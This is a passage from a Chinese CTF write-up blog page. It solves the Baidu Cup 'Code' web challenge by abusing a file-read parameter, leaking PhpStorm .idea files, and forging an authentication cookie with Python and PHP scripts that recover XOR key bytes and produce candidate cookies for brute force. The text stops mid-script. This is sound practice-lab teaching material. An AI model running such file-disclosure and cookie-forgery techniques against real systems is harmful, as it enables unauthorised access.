<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Extrader"><meta name="copyright" content="Extrader"><meta name="generator" content="Hexo 5.0.2"><meta name="theme" content="hexo-theme-yun"><title>CTF-其它 | Extrader的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="none" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.19/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_stqaphw3j4.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
});
</script><link class="aplayer-style-marker" rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script class="aplayer-script-marker" src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" defer></script><script class="meting-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/pjax@latest/pjax.min.js" defer></script><script src="/js/pjax.js" defer></script><link rel="shortcut icon" type="image/svg+xml" href="/favico.ico"><link rel="mask-icon" href="/favico.ico" color="#0078E7"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="stylesheet" href="/css/hexo-theme-yun.css"><link rel="alternate" href="/atom.xml" title="Extrader的小站" type="application/atom+xml"><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"root":"/","title":["Under","The","Sea"],"version":"0.9.6","anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"local_search":{"path":"/search.xml"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194","3, 28, 95","0, 8, 55"]}};
  </script><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><meta name="description" content="其它百度杯九月场Code界面：  url：http:&#x2F;&#x2F;b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com&#x2F;index.php?jpg&#x3D;hei.jpg，查看源码：">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF-其它">
<meta property="og:url" content="https://www.extrader.top/posts/5d485480/index.html">
<meta property="og:site_name" content="Extrader的小站">
<meta property="og:description" content="其它百度杯九月场Code界面：  url：http:&#x2F;&#x2F;b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com&#x2F;index.php?jpg&#x3D;hei.jpg，查看源码：">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200219214921326.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200219215138731.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200219215307566.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200219220208401.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200220160920767.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200220162317195.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200220162440443.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-190.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-191.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-192.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-183.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-184.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-185.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-187.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-188.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-186.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/ba81f7598149fdce96a3ad74e3ab6ff1.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200202200452558.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200202201906349.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200202202206918.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200428121257327.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200428122756772.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200502184210541.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200227120733977.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200227121027756.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200227121221514.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200227130010106.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206123430992.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206123604958.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206144030983.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206144200310.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206144515082.png">
<meta property="og:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206144617598.png">
<meta property="article:published_time" content="2020-02-29T16:00:00.000Z">
<meta property="article:modified_time" content="2020-02-29T16:00:00.000Z">
<meta property="article:author" content="Extrader">
<meta property="article:tag" content="CTF题">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200219214921326.png"><script src="/js/ui/mode.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.20.0/themes/prism.css" media="(prefers-color-scheme: light)"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.20.0/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script defer src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/" title="Extrader"><img width="96" loading="lazy" src="/images/avatar.png" alt="Extrader"></a><div class="site-author-name"><a href="/">Extrader</a></div><a class="site-name" href="/">Extrader的小站</a><sub class="site-subtitle"></sub><div class="site-desciption">不要给自己制造舒适区</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">40</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">6</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">29</span></a></div><a class="site-state-item hty-icon-button" href="/links/" title="友链"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-open-arm-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-rss-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://wpa.qq.com/msgrd?v=3&amp;uin=710712799&amp;site=qq&amp;menu=yes" title="QQ" target="_blank" style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/Extrader-home" title="GitHub" target="_blank" style="color:#6e5494"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:nowczj@gmail.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://weibo.com/extraderhome" title="微博" target="_blank" style="color:#E6162D"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-weibo-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=414334284" title="网易云音乐" target="_blank" style="color:#C10D0C"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-netease-cloud-music-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://www.zhihu.com/people/Extraderhome/" title="知乎" target="_blank" style="color:#0084FF"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-zhihu-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/397842685" title="哔哩哔哩动画" target="_blank" style="color:#FF8EB3"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-bilibili-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://twitter.com/czj710712799" title="Twitter" target="_blank" style="color:#1da1f2"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-twitter-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://t.me/extraderhome" title="Telegram" target="_blank" style="color:#0088CC"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-telegram-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/girls/" title="喜欢的女孩子" style="color:hotpink"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-women-line"></use></svg></a><a class="links-item hty-icon-button" href="/albums/" title="相册" style="color:undefined"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-gallery-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B6%E5%AE%83"><span class="toc-number">1.</span> <span class="toc-text">其它</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88%E5%9C%BACode"><span class="toc-number">1.1.</span> <span class="toc-text">百度杯九月场Code</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2019%E5%BC%BA%E7%BD%91%E6%9D%AF%E2%80%94%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2"><span class="toc-number">1.2.</span> <span class="toc-text">2019强网杯—高明的黑客</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2018HCTF%E2%80%94admin"><span class="toc-number">1.3.</span> <span class="toc-text">2018HCTF—admin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Flask-session-%E4%BC%AA%E9%80%A0"><span class="toc-number">1.3.1.</span> <span class="toc-text">Flask session 伪造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unicode%E6%AC%BA%E9%AA%97"><span class="toc-number">1.3.2.</span> <span class="toc-text">Unicode欺骗</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E6%81%92%E6%9D%AF-%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B%E2%80%94%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96"><span class="toc-number">1.4.</span> <span class="toc-text">安恒杯-新春祈福赛—枯燥的抽奖</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#De1CTF-2019%E2%80%94SSRF-Me"><span class="toc-number">1.5.</span> <span class="toc-text">De1CTF-2019—SSRF Me</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">编码问题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-2019%E2%80%94Pythonginx"><span class="toc-number">2.1.</span> <span class="toc-text">SUCTF-2019—Pythonginx</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ASIS-2019-Unicorn-shop"><span class="toc-number">2.2.</span> <span class="toc-text">[ASIS 2019]Unicorn shop</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B"><span class="toc-number">3.</span> <span class="toc-text">PHP弱类型</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E2%80%94web2-hash"><span class="toc-number">3.1.</span> <span class="toc-text">安恒月赛—web2_hash</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP%E8%B5%B0%E7%A7%81"><span class="toc-number">4.</span> <span class="toc-text">HTTP走私</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2019RoarCTF%E2%80%94Easy-Calc"><span class="toc-number">4.1.</span> <span class="toc-text">2019RoarCTF—Easy Calc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%8C%E9%9D%A2"><span class="toc-number">4.1.1.</span> <span class="toc-text">界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95"><span class="toc-number">4.1.2.</span> <span class="toc-text">解题方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8http%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E%E7%BB%95WAF"><span class="toc-number">4.1.2.1.</span> <span class="toc-text">服务器http走私漏洞绕WAF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87WAF"><span class="toc-number">4.1.2.2.</span> <span class="toc-text">PHP字符串解析特性绕过WAF</span></a></li></ol></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://www.extrader.top/posts/5d485480/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Extrader"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Extrader的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">CTF-其它</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="创建时间：2020-03-01 00:00:00" itemprop="dateCreated datePublished" datetime="2020-03-01T00:00:00+08:00">2020-03-01</time></div><div class="post-classify"><span class="post-category"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span> <span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category" href="/categories/CTF/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">CTF</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag" href="/tags/CTF%E9%A2%98/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">CTF题</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><h1 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h1><h2 id="百度杯九月场Code"><a href="#百度杯九月场Code" class="headerlink" title="百度杯九月场Code"></a>百度杯九月场Code</h2><p>界面：</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200219214921326.png" alt loading="lazy"></p>
<p>url：<code>http://b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com/index.php?jpg=hei.jpg</code>，查看源码：</p>
<a id="more"></a>

<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200219215138731.png" alt loading="lazy"></p>
<p>猜测存在文件包含读取文件操作，于是访问<code>http://b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com/index.php?jpg=index.php</code>查看源码：</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200219215307566.png" alt loading="lazy"></p>
<p>base64解密后得到index.php的源码：</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
&#x2F;**
 * Created by PhpStorm.
 * Date: 2015&#x2F;11&#x2F;16
 * Time: 1:31
 *&#x2F;
header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);
if(! isset($_GET[&#39;jpg&#39;]))
    header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?jpg&#x3D;hei.jpg&#39;);
$file &#x3D; $_GET[&#39;jpg&#39;];
echo &#39;&lt;title&gt;file:&#39;.$file.&#39;&lt;&#x2F;title&gt;&#39;;
$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;,&quot;&quot;, $file);
$file &#x3D; str_replace(&quot;config&quot;,&quot;_&quot;, $file);
$txt &#x3D; base64_encode(file_get_contents($file));

echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot;.$txt.&quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;

&#x2F;*
 * Can you find the flag file?
 *
 *&#x2F;

?&gt;</code></pre>

<p>注意注释里的这话句<code>Created by PhpStorm</code>，是用<code>PhpStorm</code>编辑器写的，用这个编辑器写的工程文件下会有一个<code>.idea</code>文件夹，<a target="_blank" rel="noopener" href="https://segmentfault.com/q/1010000008644646">详</a>，类似于这个项目的根目录文件，里面包含了一些xml文件（配置）。</p>
<p>于是访问<code>http://b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com/.idea/workspace.xml</code>得到一个xml页面，提取其中有用信息</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200219220208401.png" alt loading="lazy"></p>
<p>结合<code>index.php</code>的源码利用<code>config</code>代替<code>_</code>，于是访问<code>http://b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com/index.php?jpg=fl3gconfigichuqiu.php</code>得到<code>fl3g_ichuqiu.php</code>的源码</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
&#x2F;**
 * Created by PhpStorm.
 * Date: 2015&#x2F;11&#x2F;16
 * Time: 1:31
 *&#x2F;
error_reporting(E_ALL || ~E_NOTICE);
include(&#39;config.php&#39;);
function random($length, $chars &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#39;) &#123;
    $hash &#x3D; &#39;&#39;;
    $max &#x3D; strlen($chars) - 1;
    for($i &#x3D; 0; $i &lt; $length; $i++)    &#123;
        $hash .&#x3D; $chars[mt_rand(0, $max)];
    &#125;
    return $hash;
&#125;

function encrypt($txt,$key)&#123;
    for($i&#x3D;0;$i&lt;strlen($txt);$i++)&#123;
        $tmp .&#x3D; chr(ord($txt[$i])+10);
    &#125;
    $txt &#x3D; $tmp;
    $rnd&#x3D;random(4);
    $key&#x3D;md5($rnd.$key);
    $s&#x3D;0;
    for($i&#x3D;0;$i&lt;strlen($txt);$i++)&#123;
        if($s &#x3D;&#x3D; 32) $s &#x3D; 0;
        $ttmp .&#x3D; $txt[$i] ^ $key[++$s];
    &#125;
    return base64_encode($rnd.$ttmp);
&#125;
function decrypt($txt,$key)&#123;
    $txt&#x3D;base64_decode($txt);
    $rnd &#x3D; substr($txt,0,4);
    $txt &#x3D; substr($txt,4);
    $key&#x3D;md5($rnd.$key);

    $s&#x3D;0;
    for($i&#x3D;0;$i&lt;strlen($txt);$i++)&#123;
        if($s &#x3D;&#x3D; 32) $s &#x3D; 0;
        $tmp .&#x3D; $txt[$i]^$key[++$s];
    &#125;
    for($i&#x3D;0;$i&lt;strlen($tmp);$i++)&#123;
        $tmp1 .&#x3D; chr(ord($tmp[$i])-10);
    &#125;
    return $tmp1;
&#125;
$username &#x3D; decrypt($_COOKIE[&#39;user&#39;],$key);
if ($username &#x3D;&#x3D; &#39;system&#39;)&#123;
    echo $flag;
&#125;else&#123;
    setcookie(&#39;user&#39;,encrypt(&#39;guest&#39;,$key));
    echo &quot;╮(╯▽╰)╭&quot;;
&#125;
?&gt;</code></pre>

<p>发现分别有一个加密函数，一个解密函数，分析php代码；</p>
<p>当传入<code>cookie</code>中的<code>user</code>的值经过<code>decrypt</code>函数后返回的值为<code>system</code>，就可以得到flag，所以我们需要得到一串base64码，这一串base64经过<code>decrypt</code>函数能解出<code>system</code>，于是</p>
<p>由<code>guest</code>可以逆推出<code>rnd</code>的值和md5加密后<code>key</code>值的前5位；</p>
<p>再由<code>key</code>的前5位得出所有前6位可能的值，再通过<code>decrypt</code>函数逆推出函数中<code>$txt</code>值的后6位，再在前面加上<code>$rnd</code>的值经过base64加密后得到的16个可能的<code>user</code>值，再拿16个值去bp进行爆破，即可得到flag</p>
<p>写出解密脚本，得到<code>rnd</code>和md5加密后的<code>key</code>值</p>
<pre class="language-python" data-language="python"><code class="language-python">import base64
session &#x3D; &#39;OFZhSEdLVxga&#39;#本地user值
txt &#x3D; base64.b64decode(session.encode()).decode()
rnd &#x3D; txt[0:4]   #拿到rnd的值
ttemp &#x3D; txt[4:]
guest &#x3D; &#39;guest&#39;
tmp &#x3D; &#39;&#39;
for i in range(len(guest)):
    tmp +&#x3D; chr(ord(guest[i]) + 10)
key &#x3D; &#39;&#39;
for i in range(len(ttemp)):
    key +&#x3D; chr(ord(tmp[i]) ^ ord(ttemp[i]))#拿到key
system &#x3D; &#39;system&#39;
system1 &#x3D; &#39;&#39;
for i in range(len(system)):
    system1 +&#x3D; chr(ord(system[i]) + 10)
md5 &#x3D; &#39;0123456789abcdef&#39;#经过md5加密后的每一位数都是0-f之间的数
key_new &#x3D; &#39;&#39;
cookie_new &#x3D; &#39;&#39;
for i in range(len(md5)): #循环出所有可能的结果
    key_new  &#x3D; key + md5[i]
    session_new &#x3D; &#39;&#39;
    for j in range(len(system1)):
        session_new +&#x3D; chr(ord(key_new[j]) ^ ord(system1[j]))
    session_new &#x3D; rnd + session_new
    cookie_new &#x3D; base64.b64encode(session_new.encode()).decode()
    print(cookie_new)</code></pre>

<p>运行脚本得到16个base64加密后的值</p>
<p>按理说原题利用bp是可以爆破的出来的，但是这个题目不知道是环境的问题还是什么原因，后端的user值一直在变，意思是说<code>rnd</code>值一直在变，那md5加密后的<code>key</code>值也会变，脚本就毫无意义，所以无果，还是我哪里理解错了。。。。。先放这里，等我啥时候想明白了，或者哪位大佬告诉我原因了再补上。</p>
<p>我来填坑了，上面一步我还是理解错了，刷新界面就算会再次执行php脚本，但也会在比较完<code>$username</code>的值后再进入else函数再执行一遍<code>encrypt</code>函数回显一个新的<code>cookie</code>，所以不用考虑<code>user</code>的值会变的问题，因为在他变之前如果我们已经判断出<code>$username</code>==<code>system</code>了，就会成功拿到flag，而后台不会再调用<code>encrypt</code>函数生成新的<code>user</code>，所以这里是没有问题的，但是爆破的时候还是爆破不出来，为什么呢？我可是怀疑我的python脚本</p>
<p>在网上找个php脚本来执行一下看看二者得出来的base64有什么区别</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
    $txt1 &#x3D; &#39;guest&#39;;
    for ($i &#x3D; 0; $i &lt; strlen($txt1); $i++) &#123;
        $txt1[$i] &#x3D; chr(ord($txt1[$i])+10);
    &#125;
    $cookie_guest &#x3D; &#39;emVTQkZHCh8d&#39;; 
    $cookie_guest &#x3D; base64_decode($cookie_guest);
    $rnd &#x3D; substr($cookie_guest,0,4); 
    $ttmp &#x3D; substr($cookie_guest,4);
    $key&#x3D;&#39;&#39;;
    for ($i &#x3D; 0; $i &lt; strlen($txt1); $i++) &#123;
        $key .&#x3D; ($txt1[$i] ^ $ttmp[$i]);&#x2F;&#x2F;$key&#x3D;md5($rnd.$key);
    &#125;

    $txt2 &#x3D; &#39;system&#39;;
    for ($i &#x3D; 0; $i &lt; strlen($txt2); $i++) &#123;
        $txt2[$i] &#x3D; chr(ord($txt2[$i])+10);
    &#125;

    $md5 &#x3D; &#39;0123456789abcdef&#39;;
    for ($i &#x3D; 0; $i &lt; strlen($md5); $i++) &#123;
        $key_new &#x3D; $key.$md5[$i];
        $cookie_system&#x3D;&#39;&#39;;
        for ($j &#x3D; 0; $j &lt; strlen($txt2); $j++) &#123;
            $cookie_system .&#x3D; ($key_new[$j] ^ $txt2[$j]);
        &#125;
        $cookie_system &#x3D; base64_encode($rnd.$cookie_system);
        echo $cookie_system.&quot;&lt;&#x2F;br&gt;&quot;;
    &#125;  
?&gt;</code></pre>

<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200220160920767.png" alt loading="lazy"></p>
<p>发现预期结果和我想的并不一样，但是结果却有几分相似，逐步排查后发现到最后一步我得到的key的6位值和php上的是一样的，但结果经过base64编码后就不一样了，应该是编码的问题，在网上查了一番后发现python3默认把脚本文件用<code>utf-8</code>进行编码，python2用的是<code>ascii</code>（我用的是python3，python2不会出现这种情况），而php对base64编码的函数是好像用的ascii进行编码（应该~，后文验证），于是改用脚本base64编码方式，这里使用<code>Latin1</code>进行编码，<strong>Latin1编码是单字节编码，向下兼容ASCII，</strong>其编码范围是0x00-0xFF，0x00-0x7F之间完全和ASCII一致，0x80-0x9F之间是控制字符，0xA0-0xFF之间是文字符号，<a target="_blank" rel="noopener" href="https://blog.csdn.net/BLGT_57/article/details/80848492">详</a></p>
<pre class="language-python" data-language="python"><code class="language-python">import requests
import base64
